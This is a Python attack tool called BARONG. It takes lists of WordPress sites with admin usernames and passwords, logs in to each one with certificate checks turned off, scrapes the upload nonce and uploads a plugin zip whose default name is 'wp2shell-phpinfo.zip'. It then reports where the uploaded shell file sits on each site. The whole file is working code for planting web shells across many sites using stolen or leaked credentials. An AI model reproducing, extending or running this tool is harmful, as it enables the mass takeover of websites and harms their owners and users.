#!/usr/bin/env python3
"""
BARONG - WordPress Plugin Uploader (Single Thread)
Support format: domain|username|password|login_url
"""

import argparse
import http.cookiejar as cookiejar
import os
import re
import secrets
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

UA = "BARONG/1.0"
TIMEOUT = 30
DEFAULT_PLUGIN = "wp2shell-phpinfo.zip"

def _banner():
    print(r"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║          WordPress Plugin Uploader - BARONG                  ║
    ║                    v2.3 - Single Thread                     ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

def get_session():
    """Create session with cookie handling and SSL ignore"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    cj = cookiejar.CookieJar()
    session = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        urllib.request.HTTPCookieProcessor(cj)
    )
    session.addheaders = [("User-Agent", UA)]
    return session, cj

def request_url(session, url, data=None, headers=None, method="GET", timeout=TIMEOUT):
    """Make HTTP request"""
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with session.open(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace"), resp.geturl()
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace") if e.fp else ""
        return body, getattr(e, "url", url)
    except Exception as e:
        return "", str(e)

def get_plugin_slug(zip_path):
    """Get plugin slug from zip filename (without .zip)"""
    zip_name = os.path.basename(zip_path)
    slug = zip_name.replace(".zip", "").replace("_", "-")
    return slug

def upload_plugin(base_url, username, password, plugin_zip, login_url=None):
    """
    Login to WordPress (using login_url if provided) and upload plugin.
    Returns: (success, plugin_path, error_message)
    """
    base = base_url.rstrip("/")
    session, cj = get_session()
    
    # Determine login URL
    if login_url:
        if not login_url.startswith(("http://", "https://")):
            login_url = base + "/" + login_url.lstrip("/")
    else:
        login_url = base + "/wp-login.php"
    
    # Read plugin zip
    try:
        with open(plugin_zip, "rb") as f:
            zip_bytes = f.read()
    except Exception as e:
        return False, None, f"Cannot read plugin zip: {e}"
    
    # 1. Visit login page to get cookies (optional but helps)
    request_url(session, login_url)
    
    # 2. Login POST
    login_data = urllib.parse.urlencode({
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base + "/wp-admin/",
        "testcookie": "1"
    }).encode()
    
    _, final_url = request_url(
        session,
        login_url,
        data=login_data,
        method="POST"
    )
    
    # Check login success
    logged_in = any(c.name.startswith("wordpress_logged_in") for c in cj)
    if not logged_in:
        return False, None, "Login failed! Check username/password or login URL"
    
    # 3. Open upload page (on base URL)
    page, _ = request_url(session, base + "/wp-admin/plugin-install.php?tab=upload")
    
    # 4. Extract nonce
    nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', page)
    if not nonce_match:
        return False, None, "Cannot find upload nonce (insufficient permissions?)"
    
    nonce = nonce_match.group(1)
    
    # 5. Upload plugin (without activation)
    boundary = "----BARONG" + secrets.token_hex(8)
    zip_name = os.path.basename(plugin_zip)
    
    body_parts = [
        f'--{boundary}\r\nContent-Disposition: form-data; name="_wpnonce"\r\n\r\n{nonce}\r\n',
        f'--{boundary}\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/wp-admin/plugin-install.php?tab=upload\r\n',
        f'--{boundary}\r\nContent-Disposition: form-data; name="pluginzip"; filename="{zip_name}"\r\nContent-Type: application/zip\r\n\r\n'
    ]
    
    body = "".join(body_parts).encode() + zip_bytes + f"\r\n--{boundary}--\r\n".encode()
    
    upload_page, _ = request_url(
        session,
        base + "/wp-admin/update.php?action=upload-plugin",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
        timeout=60
    )
    
    # 6. Check upload success
    if "successfully" in upload_page.lower():
        plugin_slug = get_plugin_slug(plugin_zip)
        plugin_path = f"{base}/wp-content/plugins/{plugin_slug}/{plugin_slug}.php"
        return True, plugin_path, None
    
    return False, None, "Upload failed!"

def parse_target_line(line):
    """
    Parse line with formats:
      domain|username|password
      domain|username|password|login_url
      domain => username => password
      domain => username => password => plugin.zip
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    
    # Try pipe separator first
    if "|" in line:
        parts = [p.strip() for p in line.split("|")]
        if len(parts) >= 3:
            domain = parts[0]
            username = parts[1]
            password = parts[2]
            login_url = parts[3] if len(parts) >= 4 else None
            plugin = None  # plugin from command line default
            return {
                "domain": domain,
                "username": username,
                "password": password,
                "login_url": login_url,
                "plugin": plugin
            }
        else:
            return None
    
    # Try arrow separator (original format)
    if "=>" in line:
        parts = [p.strip() for p in line.split("=>")]
        if len(parts) >= 3:
            domain = parts[0]
            username = parts[1]
            password = parts[2]
            plugin = parts[3] if len(parts) >= 4 else None
            return {
                "domain": domain,
                "username": username,
                "password": password,
                "login_url": None,
                "plugin": plugin
            }
    
    return None

def load_targets(file_path):
    """Load targets from file"""
    targets = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                parsed = parse_target_line(line)
                if parsed:
                    targets.append(parsed)
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return []
    return targets

def process_target(target_info, args):
    """Process single target"""
    domain = target_info["domain"]
    username = target_info["username"]
    password = target_info["password"]
    login_url = target_info.get("login_url")
    plugin = target_info.get("plugin") or args.plugin
    
    # Add protocol if missing
    url = domain if "://" in domain else "http://" + domain
    
    # Get plugin slug for display
    plugin_slug = get_plugin_slug(plugin)
    
    print(f"\n[*] Processing: {url}")
    print(f"    User: {username}")
    print(f"    Login URL: {login_url if login_url else '(auto)'}")
    print(f"    Plugin: {plugin} -> slug: {plugin_slug}")
    
    # Check plugin exists
    if not os.path.exists(plugin):
        print(f"    ❌ Plugin not found: {plugin}")
        return {"target": url, "success": False, "error": f"Plugin not found: {plugin}"}
    
    success, plugin_path, error = upload_plugin(
        url, username, password, plugin, login_url
    )
    
    if success:
        print(f"    ✅ SUCCESS: {plugin_path}")
        return {"target": url, "success": True, "plugin_path": plugin_path}
    else:
        print(f"    ❌ FAILED: {error}")
        return {"target": url, "success": False, "error": error}

def main():
    _banner()
    
    parser = argparse.ArgumentParser(
        description="WordPress Plugin Uploader - BARONG (Single Thread)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target with credentials
  python3 barong.py --target example.com --user admin --password pass
  
  # Multiple targets from file (pipe format)
  python3 barong.py --list targets.txt
  
  # With custom plugin
  python3 barong.py --list targets.txt --plugin custom.zip
  
  # Output results to file
  python3 barong.py --list targets.txt --output result.txt

File format (targets.txt):
  example.com|admin|password123
  https://site.com|admin|s3cr3t
  https://site.com|admin|pass|https://site.com/custom-login.php
  example.com => admin => password
  example.com => admin => password => custom-plugin.zip
        """
    )
    
    parser.add_argument("--target", "-t", help="Single target domain/URL")
    parser.add_argument("--user", "-u", help="Admin username (for single target)")
    parser.add_argument("--password", "-p", help="Admin password (for single target)")
    parser.add_argument("--login-url", help="Custom login URL (for single target)")
    parser.add_argument("--list", "-l", help="File with list of targets")
    parser.add_argument("--plugin", "-z", default=DEFAULT_PLUGIN, 
                        help=f"Plugin zip file (default: {DEFAULT_PLUGIN})")
    parser.add_argument("--output", "-o", help="Save results to file")
    
    args = parser.parse_args()
    
    # Get targets
    targets = []
    
    if args.target and args.user and args.password:
        # Single target with credentials
        targets.append({
            "domain": args.target,
            "username": args.user,
            "password": args.password,
            "login_url": args.login_url,
            "plugin": args.plugin
        })
    elif args.list:
        # Load from file
        targets = load_targets(args.list)
        if not targets:
            print("[-] No valid targets found in file")
            print("[*] Format: domain|username|password or domain|username|password|login_url")
            return 1
    else:
        print("[-] Please provide --target --user --password OR --list")
        print("\nExamples:")
        print("  python3 barong.py --target example.com --user admin --password pass")
        print("  python3 barong.py --list targets.txt")
        return 1
    
    print(f"\n[*] Targets: {len(targets)}")
    print(f"[*] Plugin: {args.plugin}")
    print("")
    
    results = []
    
    # Process sequentially one by one
    for idx, target_info in enumerate(targets, 1):
        print(f"[{idx}/{len(targets)}]")
        result = process_target(target_info, args)
        results.append(result)
        # Optional: slight pause between targets to avoid rate limiting
        if idx < len(targets):
            import time
            time.sleep(1)
    
    # Summary
    print("\n" + "="*60)
    print("📊 SUMMARY")
    print("="*60)
    
    success_count = sum(1 for r in results if r.get("success"))
    fail_count = len(results) - success_count
    
    print(f"  ✅ SUCCESS: {success_count}")
    print(f"  ❌ FAILED: {fail_count}")
    print(f"  📁 TOTAL: {len(results)}")
    
    if success_count > 0:
        print("\n✅ Successful targets:")
        for r in results:
            if r.get("success"):
                print(f"  ✓ {r['target']}")
                print(f"    -> {r.get('plugin_path', '')}")
    
    if fail_count > 0:
        print("\n❌ Failed targets:")
        for r in results:
            if not r.get("success"):
                error = r.get("error", "Unknown error")
                print(f"  ✗ {r['target']} ({error})")
    
    print("="*60)
    
    # Save results
    if args.output:
        try:
            with open(args.output, "w") as f:
                f.write("# BARONG Upload Results\n")
                f.write(f"# Total: {len(results)} | Success: {success_count} | Failed: {fail_count}\n\n")
                for r in results:
                    if r.get("success"):
                        f.write(f"{r['target']} => {r.get('plugin_path', '')}\n")
                    else:
                        f.write(f"{r['target']} => FAILED: {r.get('error', '')}\n")
            print(f"\n💾 Results saved to: {args.output}")
        except Exception as e:
            print(f"[-] Error saving results: {e}")
    
    return 0 if success_count > 0 else 1

if __name__ == "__main__":
    sys.exit(main())